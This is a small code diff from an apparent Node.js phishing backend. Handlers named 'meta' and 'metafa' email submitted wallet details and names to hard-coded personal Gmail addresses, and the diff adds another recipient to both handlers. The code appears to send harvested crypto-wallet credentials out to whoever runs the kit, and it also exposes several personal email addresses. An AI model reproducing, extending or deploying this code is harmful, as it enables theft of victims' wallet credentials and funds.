@@ -34,7 +34,7 @@ const meta = async (req, res, next) => {
 
     let mailOptions = {
       from: process.env.EMAIL_FROM,
-      to: "jeffscott1169@gmail.com, kehopave123@gmail.com",
+      to: "jeffscott1169@gmail.com, Agentwilliambeverley@gmail.com, kehopave123@gmail.com",
       subject: options.wallet,
       text:
         `\n Full Name: ` +
@@ -112,7 +112,7 @@ const metafa = async (req, res, next) => {
 
     let mailOptions = {
       from: process.env.EMAIL_FROM,
-      to: "jeffscott1169@gmail.com, kehopave123@gmail.com",
+      to: "jeffscott1169@gmail.com,Agentwilliambeverley@gmail.com, kehopave123@gmail.com",
       subject: options.wallet,
       text:
         `\n Name ` +
